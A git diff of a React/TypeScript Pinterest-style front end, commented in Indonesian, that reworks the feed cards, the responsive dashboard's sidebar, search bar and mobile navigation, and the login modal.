-          {/* Bagian Bawah: Konten Teks & Deretan Tombol Aksi */}
-          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
-            
-            {/* Judul & Pembuat Ide */}
-            <div style={{ color: "#fff", textAlign: "left" }}>
-              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, lineHeight: 1.3, textShadow: "0 1px 3px rgba(0,0,0,0.6)" }}>
-                {item.title || "Nature Landscape - Mountain Views"}
+          <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
+            <div style={{ color: "#fff", textAlign: "left", paddingLeft: 4 }}>
+              <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, lineHeight: 1.3, textShadow: "0 1px 4px rgba(0,0,0,0.6)" }}>
+                {item.title}
               </h3>
               <div style={{ display: "flex", alignItems: "center", gap: 6, marginTop: 6 }}>
                 <div style={{ width: 22, height: 22, borderRadius: "50%", background: "rgba(255,255,255,0.8)", color: "#111", fontSize: 11, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center" }}>
                   T
                 </div>
-                <span style={{ fontSize: 12, opacity: 0.9, fontWeight: 500 }}>Travel Explorer</span>
+                <span style={{ fontSize: 12, opacity: 0.9, fontWeight: 500, textShadow: "0 1px 2px rgba(0,0,0,0.5)" }}>Travel Explorer</span>
               </div>
             </div>
 
-            {/* Ikon Bar Aksi Bulat */}
             <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
               <div style={{ display: "flex", gap: 8 }}>
-                {/* Tombol Bagikan */}
-                <button style={{ width: 34, height: 34, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5">
-                    <circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/>
-                    <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
-                  </svg>
+                <button style={{ width: 36, height: 36, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg>
                 </button>
-                {/* Tombol Opsi Tiga Titik */}
-                <button style={{ width: 34, height: 34, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", fontWeight: 700, fontSize: 14 }}>
+                <button style={{ width: 36, height: 36, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", fontWeight: 700, fontSize: 14, color: "#111" }}>
                   ···
                 </button>
               </div>
-
-              {/* Tombol Unduh / Download */}
-              <button style={{ width: 34, height: 34, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
-                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
-                </svg>
+              <button style={{ width: 36, height: 36, background: "rgba(255,255,255,0.85)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer" }}>
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
               </button>
             </div>
-
           </div>
+        </div>
+      )}
+
+      {!hov && (
+        <div style={{ position: "absolute", bottom: 10, right: 10, opacity: 0.85 }}>
+          <button style={{ width: 28, height: 28, background: "rgba(255,255,255,0.95)", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 13, color: "#111", fontWeight: "bold", boxShadow: "0 2px 4px rgba(0,0,0,0.1)" }}>
+            ···
+          </button>
         </div>
       )}
     </div>
   );
 }
+
 // ─────────────────────────────────────────────
-// RESPONSIVE DASHBOARD (Desktop Side / Mobile Bottom)
+// RESPONSIVE DASHBOARD PAGE (WHITE LIGHT THEME)
 // ─────────────────────────────────────────────
 function Dashboard({ userEmail, onLogout }: { userEmail: string; onLogout: () => void }) {
   const [search, setSearch] = useState("");
-  const [colCount, setColCount] = useState(5);
-  const [showProfile, setShowProfile] = useState(false);
+  const [colCount, setColCount] = useState(4);
   const [isMobile, setIsMobile] = useState(false);
+  
+  const [hoveredIcon, setHoveredIcon] = useState<string | null>(null);
+  const [hoveredLogo, setHoveredLogo] = useState(false);
 
   useEffect(() => {
     const handleResize = () => {
       const width = window.innerWidth;
       setIsMobile(width < 768);
-      
-      if (width < 480) {
-        setColCount(2); // Grid 2 Kolom untuk HP
-      } else if (width < 768) {
-        setColCount(3);
-      } else {
-        setColCount(Math.max(4, Math.floor((width - 110) / 230)));
-      }
+      if (width < 480) setColCount(2); 
+      else if (width < 800) setColCount(3);
+      else if (width < 1100) setColCount(4);
+      else setColCount(5);
     };
-
     handleResize();
     window.addEventListener("resize", handleResize);
     return () => window.removeEventListener("resize", handleResize);
   }, []);
 
-  const cols: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
-  feedItems.forEach((item, i) => cols[i % colCount].push(item));
+ // BARU
+const shuffledFeed = useMemo(() => [...feedItems].sort(() => Math.random() - 0.5), []);
+const cols = useMemo(() => {
+  const c: typeof feedItems[][] = Array.from({ length: colCount }, () => []);
+  shuffledFeed.forEach((item, i) => c[i % colCount].push(item));
+  return c;
+}, [shuffledFeed, colCount]);
 
-  const avatar = userEmail.charAt(0).toUpperCase();
+  const menuItems = [
+    {
+      id: "home",
+      label: "Home",
+      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>,
+      isActive: true
+    },
+    {
+      id: "explore",
+      label: "Explore",
+      icon: <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="10"/><path d="m16.2 7.8-2 6.3-6.4 2.1 2.1-6.4z"/></svg>,
+      isActive: false
+    },
+    {
+      id: "boards",
+      label: "Your Boards",
+      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="3" width="7" height="9" rx="1.5"/><rect x="14" y="3" width="7" height="5" rx="1.5"/><rect x="14" y="12" width="7" height="9" rx="1.5"/><rect x="3" y="16" width="7" height="5" rx="1.5"/></svg>,
+      isActive: false
+    },
+    {
+      id: "create",
+      label: "Create",
+      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="3" width="18" height="18" rx="5"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></svg>,
+      isActive: false
+    },
+    {
+      id: "notifications",
+      label: "Notifications",
+      icon: (
+        <div style={{ position: "relative", display: "inline-block" }}>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+          <div style={{ position: "absolute", top: 2, right: 2, width: 6, height: 6, background: "#e60023", borderRadius: "50%" }} />
+        </div>
+      ),
+      isActive: false
+    },
+     {
+      id: "messages",
+      label: "Messages",
+      icon: <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>,
+      isActive: false
+    }
+  ];
 
   return (
-    <div style={{ 
-      minHeight: "100vh", 
-      background: isMobile ? "#000" : "#fff", // Menjadi tema gelap di HP sesuai gambar
-      color: isMobile ? "#fff" : "#111",
-      fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif", 
-      display: "flex",
-      flexDirection: "column"
-    }}>
-
-      {/* ── SIDEBAR NAV (Hanya muncul jika Desktop/Tablet) ── */}
+    <div style={{ minHeight: "100vh", background: "#fff", color: "#111", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif", display: "flex", flexDirection: "column" }}>
+      
+      {/* ── 1. DESKTOP SIDEBAR NAVIGATION ── */}
       {!isMobile && (
-        <div style={{ width: 72, position: "fixed", top: 0, bottom: 0, left: 0, background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0", gap: 22, zIndex: 101 }}>
-          {/* LINGKARAN LOGO DI SIDEBAR (TEMPAT 2) */}
-          <div style={{ width: 40, height: 40, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", marginBottom: 10 }}>
-            <svg width="22" height="22" viewBox="0 0 24 24" fill="white">
-              <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
-            </svg>
+        <div style={{ width: 72, position: "fixed", top: 0, bottom: 0, left: 0, background: "#fff", display: "flex", flexDirection: "column", alignItems: "center", padding: "20px 0", zIndex: 110, borderRight: "1px solid #efefef" }}>
+          {/* LOGO */}
+          <div onMouseEnter={() => setHoveredLogo(true)} onMouseLeave={() => setHoveredLogo(false)} style={{ width: "100%", padding: "0 10px", boxSizing: "border-box", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", marginBottom: 24, position: "relative" }}>
+            <img src="favicon.png" alt="Pinterest" style={{ width: 31, height: 31, objectFit: "contain" }} />
+            {hoveredLogo && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", pointerEvents: "none", boxShadow: "0 4px 12px rgba(0,0,0,0.15)", zIndex: 120 }}>Home</div>}
           </div>
-          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></button>
-          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="10"/><path d="m16.2 7.8-2 6.3-6.4 2.1 2.1-6.4z"/></svg></button>
-          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M9 17V7h3a3 3 0 0 1 3 3v0a3 3 0 0 1-3 3H9"/></svg></button>
-          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg></button>
-          <button style={{ background: "none", border: "none", cursor: "pointer", padding: 8, color: "#111" }}><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg></button>
-          <div style={{ marginTop: "auto" }}>
-            <button onClick={() => setShowProfile(v => !v)} style={{ width: 38, height: 38, borderRadius: "50%", border: "none", background: "#efefef", color: "#111", fontSize: 14, fontWeight: 700, cursor: "pointer" }}>{avatar}</button>
+
+          {/* MENU */}
+          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: 30, width: "100%" }}>
+            {menuItems.map((menu) => {
+              const isHovered = hoveredIcon === menu.id;
+              return (
+                <div key={menu.id} style={{ position: "relative", display: "flex", alignItems: "center" }}>
+                  <button onMouseEnter={() => setHoveredIcon(menu.id)} onMouseLeave={() => setHoveredIcon(null)} style={{ width: 44, height: 44, background: menu.isActive ? "#111" : isHovered ? "#f0f0f0" : "none", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", color: menu.isActive ? "#fff" : "#111", transition: "all 0.2s" }}>
+                    {menu.icon}
+                  </button>
+                  {isHovered && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", pointerEvents: "none", zIndex: 120 }}>{menu.label}</div>}
+                </div>
+              );
+            })}
+          </div>
+
+          {/* DESKTOP LOGOUT */}
+          <div style={{ marginTop: "auto", position: "relative", display: "flex", alignItems: "center" }}>
+            <button onClick={onLogout} onMouseEnter={() => setHoveredIcon("logout")} onMouseLeave={() => setHoveredIcon(null)} style={{ width: 44, height: 44, background: hoveredIcon === "logout" ? "#f0f0f0" : "none", border: "none", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", color: "#111", transition: "all 0.2s" }}>
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+            </button>
+            {hoveredIcon === "logout" && <div style={{ position: "absolute", left: 54, background: "#111", color: "#fff", padding: "8px 12px", borderRadius: 8, fontSize: 12, fontWeight: 600, whiteSpace: "nowrap", zIndex: 120 }}>Log out</div>}
           </div>
         </div>
       )}
 
-      {/* ── AREA KONTEN UTAMA ── */}
+      {/* ── 2. TOP NAVBAR (ADAPTIF DESKTOP & MOBILE) ── */}
       <div style={{ 
-        flex: 1, 
-        marginLeft: isMobile ? 0 : 72, 
-        padding: isMobile ? "0 8px" : "0 24px",
-        paddingBottom: isMobile ? 80 : 20
+        position: "fixed", 
+        top: 0, 
+        left: isMobile ? 0 : 72, 
+        right: 0, 
+        height: 68, 
+        background: "#fff", 
+        display: "flex", 
+        alignItems: "center", 
+        gap: 12, 
+        padding: "0 16px", 
+        zIndex: 100, 
+        boxSizing: "border-box" 
       }}>
-        
-        {/* ── TOP NAVBAR ── */}
-        <div style={{ 
-          position: "fixed", 
-          top: 0, 
-          left: isMobile ? 0 : 72, 
-          right: 0, 
-          height: 64, 
-          background: isMobile ? "rgba(0,0,0,0.85)" : "#fff", 
-          backdropFilter: isMobile ? "blur(12px)" : "none",
-          display: "flex", 
-          alignItems: "center", 
-          gap: 12, 
-          padding: "0 16px", 
-          zIndex: 100 
-        }}>
-          
-          <div style={{ flex: 1, position: "relative", display: "flex", alignItems: "center" }}>
-            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={isMobile ? "#b2b2b2" : "#767676"} strokeWidth="3" style={{ position: "absolute", left: 16 }}>
-              <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        {/* Search Bar Input */}
+        <div style={{ flex: 1, position: "relative", display: "flex", alignItems: "center" }}>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="3.5" style={{ position: "absolute", left: 16 }}>
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+          <input 
+            value={search} 
+            onChange={e => setSearch(e.target.value)} 
+            placeholder={isMobile ? "Cari ide" : "Search"}
+            style={{ 
+              width: "100%", 
+              padding: "12px 84px 12px 44px",
+              background: "#e9e9e9", 
+              border: "none", 
+              borderRadius: 24, 
+              fontSize: 16, 
+              outline: "none", 
+              color: "#111", 
+              fontFamily: "inherit" 
+            }} 
+          />
+
+          {/* KONTAINER IKON KAMERA & MIKROFON (VN) DI DALAM SEARCH BAR */}
+          <div style={{ position: "absolute", right: 16, display: "flex", alignItems: "center", gap: 12, color: "#111" }}>
+            {/* ICON PICTURE / KAMERA */}
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }}>
+              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+              <circle cx="12" cy="13" r="4"/>
             </svg>
-            <input 
-              value={search} 
-              onChange={e => setSearch(e.target.value)} 
-              placeholder={isMobile ? "Cari ide" : "Search"}
-              style={{ 
-                width: "100%", 
-                padding: "10px 44px 10px 44px", 
-                background: isMobile ? "rgba(255,255,255,0.15)" : "#e9e9e9", 
-                border: "none", 
-                borderRadius: 24, 
-                fontSize: 15, 
-                outline: "none", 
-                color: isMobile ? "#fff" : "#111" 
-              }} 
-            />
-            <div style={{ position: "absolute", right: 16, color: isMobile ? "#fff" : "#111", display: "flex", alignItems: "center" }}>
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
-            </div>
+            
+            {/* ICON VN / MIKROFON */}
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.3" strokeLinecap="round" strokeLinejoin="round" style={{ cursor: "pointer" }}>
+              <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"/>
+              <path d="M19 10v2a7 7 0 0 1-14 0v-2M12 19v3"/>
+            </svg>
           </div>
-
-          {isMobile && (
-            <button onClick={onLogout} style={{ background: "none", border: "none", color: "#e60023", fontWeight: 600, fontSize: 13, cursor: "pointer" }}>
-              Log out
-            </button>
-          )}
-
-          {!isMobile && (
-            <div style={{ display: "flex", alignItems: "center" }}>
-              <button style={{ width: 32, height: 32, borderRadius: "50%", border: "none", background: "#efefef", fontSize: 13, fontWeight: 700, color: "#111" }}>{avatar}</button>
-              <button style={{ background: "none", border: "none", marginLeft: 4 }}><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="3"><path d="m6 9 6 6 6-6"/></svg></button>
-            </div>
-          )}
         </div>
 
-        {/* ── MASONRY FEED GRID ── */}
-        <div style={{ paddingTop: 72 }}>
-          {!isMobile && (
-            <div style={{ marginBottom: 16, paddingLeft: 6 }}>
-              <span style={{ fontSize: 16, fontWeight: 700, borderBottom: "3px solid #111", paddingBottom: 6 }}>All</span>
+        {/* Sisi Kanan Header: Tombol Log Out Merah di Mobile */}
+        {isMobile ? (
+          <button 
+            onClick={onLogout} 
+            style={{ background: "none", border: "none", color: "#e60023", fontSize: 15, fontWeight: 600, cursor: "pointer", padding: "0 4px" }}
+          >
+            Log out
+          </button>
+        ) : (
+          <div style={{ display: "flex", alignItems: "center", gap: 4, cursor: "pointer" }}>
+            <div style={{ width: 32, height: 32, borderRadius: "50%", background: "#efefef", fontSize: 13, fontWeight: "bold", display: "flex", alignItems: "center", justifyContent: "center", color: "#111" }}>
+              {userEmail.charAt(0).toUpperCase() || "U"}
             </div>
-          )}
-
-          <div style={{ display: "flex", gap: 10, alignItems: "flex-start" }}>
-            {cols.map((col, ci) => (
-              <div key={ci} style={{ flex: 1, minWidth: 0 }}>
-                {col.map((item, pi) => (
-                  <FeedCard key={pi} item={item} />
-                ))}
-              </div>
-            ))}
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#767676" strokeWidth="3.5"><path d="m6 9 6 6 6-6"/></svg>
           </div>
+        )}
+      </div>
+
+      {/* ── 3. MAIN GRID CONTENT (MASONRY) ── */}
+      <div style={{ flex: 1, marginLeft: isMobile ? 0 : 72, padding: "80px 8px 80px 8px", boxSizing: "border-box" }}>
+        {!isMobile && (
+          <div style={{ marginBottom: 18, paddingLeft: 6 }}>
+            <span style={{ fontSize: 15, fontWeight: 700, borderBottom: "3px solid #111", paddingBottom: 6, color: "#111" }}>All</span>
+          </div>
+        )}
+
+        {/* Flex Masonry Columns */}
+        <div style={{ display: "flex", gap: isMobile ? 10 : 14, alignItems: "flex-start" }}>
+          {cols.map((col, ci) => (
+            <div key={ci} style={{ flex: 1, minWidth: 0 }}>
+              {col.map((item, pi) => (
+                <FeedCard key={pi} item={item} />
+              ))}
+            </div>
+          ))}
         </div>
       </div>
 
-      {/* ── BOTTOM NAVBAR (Hanya Render di HP/Mobile) ── */}
+      {/* ── 4. MOBILE BOTTOM NAVIGATION BAR ── */}
       {isMobile && (
         <div style={{ 
           position: "fixed", 
           bottom: 0, 
           left: 0, 
           right: 0, 
-          height: 60, 
-          background: "#111", 
+          height: 64, 
+          background: "#fff", 
           display: "flex", 
           justifyContent: "space-around", 
           alignItems: "center", 
-          zIndex: 101,
-          borderTop: "1px solid rgba(255,255,255,0.08)",
-          paddingBottom: "calc(env(safe-area-inset-bottom) / 2)"
+          zIndex: 110,
+          borderTop: "1px solid #efefef",
+          paddingBottom: "env(safe-area-inset-bottom)" 
         }}>
-          {/* Home Icon */}
-          <button style={{ background: "none", border: "none", color: "#fff", cursor: "pointer" }}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
-          </button>
-          
-          {/* Explore Search Icon */}
-          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
-          </button>
-          
-          {/* Create Plus Icon */}
-          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
-          </button>
-          
-          {/* Notification Chat Icon */}
-          <button style={{ background: "none", border: "none", color: "#b2b2b2", cursor: "pointer" }}>
-            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-          </button>
-          
-          {/* Profile Avatar Icon */}
-          <button style={{ width: 26, height: 26, borderRadius: "50%", border: "2px solid #b2b2b2", background: "#efefef", color: "#111", fontSize: 11, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center" }}>
-            {avatar}
+          {menuItems.map((menu) => (
+            <button 
+              key={menu.id} 
+              style={{ 
+                background: "none", 
+                border: "none", 
+                color: menu.isActive ? "#111" : "#767676", 
+                cursor: "pointer", 
+                display: "flex", 
+                alignItems: "center", 
+                justifyContent: "center",
+                width: 50,
+                height: 50
+              }}
+            >
+              {menu.icon}
+            </button>
+          ))}
+          {/* Avatar Bulat Profile Mobile */}
+          <button style={{ background: "none", border: "none", display: "flex", alignItems: "center", justifyContent: "center" }}>
+            <div style={{ width: 24, height: 24, borderRadius: "50%", background: "#efefef", color: "#111", fontSize: 11, fontWeight: "bold", display: "flex", alignItems: "center", justifyContent: "center" }}>
+              {userEmail.charAt(0).toUpperCase() || "S"}
+            </div>
           </button>
         </div>
       )}
 
-      {/* Dropdown desktop popup profile menu */}
-      {!isMobile && showProfile && (
-        <div style={{ position: "fixed", bottom: 70, left: 16, background: "#fff", border: "1px solid #efefef", borderRadius: 16, boxShadow: "0 4px 24px rgba(0,0,0,.15)", minWidth: 160, zIndex: 200, padding: 4 }}>
-          <button onClick={onLogout} style={{ width: "100%", padding: "10px 14px", background: "none", border: "none", color: "#e60023", fontWeight: 600, textAlign: "left", cursor: "pointer", fontSize: 14 }}>
-            Log out
-          </button>
-        </div>
-      )}
     </div>
   );
 }
 
 // ─────────────────────────────────────────────
-// SOCIAL BUTTON
+// SOCIAL BUTTON (TIDAK BERUBAH)
 // ─────────────────────────────────────────────
 function SocialBtn({ children, onClick }: { children: React.ReactNode; onClick: () => void }) {
   const [hov, setHov] = useState(false);
@@ -532,7 +546,7 @@ function SocialBtn({ children, onClick }: { children: React.ReactNode; onClick: 
 }
 
 // ─────────────────────────────────────────────
-// ROOT APP
+// ROOT APP (DENGAN LOGIN PAGE YANG SUDAH DISESUAIKAN)
 // ─────────────────────────────────────────────
 export default function App() {
   const [page, setPage] = useState<"login" | "dashboard">("login");
@@ -559,9 +573,8 @@ export default function App() {
 
     await new Promise(r => setTimeout(r, 600));
     setLoading(false);
-
-    setLoggedUser(email);
     setPage("dashboard");
+    setLoggedUser(email);
   }
 
   if (page === "dashboard") {
@@ -569,11 +582,10 @@ export default function App() {
   }
 
   return (
-    <div style={{ minHeight: "100vh", overflow: "hidden", position: "relative" }}>
+    <div style={{ minHeight: "100vh", overflow: "hidden", position: "relative", fontFamily: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
       <MasonryBackground />
       <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.42)", backdropFilter: "blur(1px)" }} />
 
-      {/* Sign up top-left */}
       <div style={{ position: "fixed", top: 16, left: 16, zIndex: 15 }}>
         <button onClick={() => setShowSignUp(true)}
           style={{ padding: "10px 20px", background: "#fff", color: "#111", border: "none", borderRadius: 50, fontSize: 14, fontWeight: 700, cursor: "pointer", boxShadow: "0 2px 8px rgba(0,0,0,.2)" }}
@@ -583,15 +595,11 @@ export default function App() {
         </button>
       </div>
 
-      {/* Login modal */}
       <div style={{ position: "fixed", inset: 0, display: "flex", alignItems: "center", justifyContent: "center", zIndex: 10, padding: 16 }}>
         <div style={{ background: "#fff", borderRadius: 24, padding: "40px 32px 28px", width: "100%", maxWidth: 380, boxShadow: "0 8px 40px rgba(0,0,0,.35)", textAlign: "center" }}>
 
-          {/* LINGKARAN LOGO DI LOGIN MODAL (TEMPAT 3) */}
-          <div style={{ width: 44, height: 44, background: "#e60023", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 18px" }}>
-            <svg width="26" height="26" viewBox="0 0 24 24" fill="white">
-              <path d="M12 0a12 12 0 0 0-4.37 23.17c-.07-.63-.13-1.6.03-2.3l1.42-6s-.36-.73-.36-1.81c0-1.7 1-2.97 2.22-2.97 1.05 0 1.55.79 1.55 1.73 0 1.05-.67 2.62-1.02 4.09-.29 1.22.6 2.22 1.81 2.22 2.18 0 3.86-2.3 3.86-5.62 0-2.94-2.1-5-5.13-5-3.5 0-5.55 2.62-5.55 5.33 0 1.06.4 2.2.92 2.83a.3.3 0 0 1 .07.28c-.1.42-.33 1.34-.38 1.52-.06.27-.22.33-.5.2-1.88-.88-3.06-3.63-3.06-5.84 0-4.75 3.45-9.12 10-9.12 5.23 0 9.3 3.73 9.3 8.72 0 5.2-3.28 9.39-7.85 9.39-1.53 0-2.97-.8-3.46-1.73l-.94 3.6c-.34 1.3-1.27 2.94-1.9 3.97A12 12 0 1 0 12 0z"/>
-            </svg>
